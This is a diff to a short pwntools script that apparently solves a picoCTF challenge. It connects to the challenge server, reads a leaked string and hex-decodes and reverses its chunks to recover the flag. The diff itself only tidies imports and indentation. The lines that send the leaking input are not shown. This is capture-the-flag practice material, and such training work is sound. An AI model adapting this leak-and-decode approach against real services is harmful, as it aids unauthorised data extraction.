@@ -1,4 +1,4 @@
-from pwn import *
+from pwn import remote
 
 r = remote('mercury.picoctf.net', 16439)
 print(r.recvuntil('2) View my portfolio\n').decode().strip())
@@ -11,11 +11,11 @@ print(leak)
 leak = leak.split('.')
 flag = ""
 for data in leak:
-	try:
-		#Try to print if it's decodable from hex to ascii
-		data = bytes.fromhex(data).decode()[::-1]
-		flag += data
-	except:
-		continue
+    try:
+        # Try to print if it's decodable from hex to ascii
+        data = bytes.fromhex(data).decode()[::-1]
+        flag += data
+    except:
+        continue
 
 print(flag)
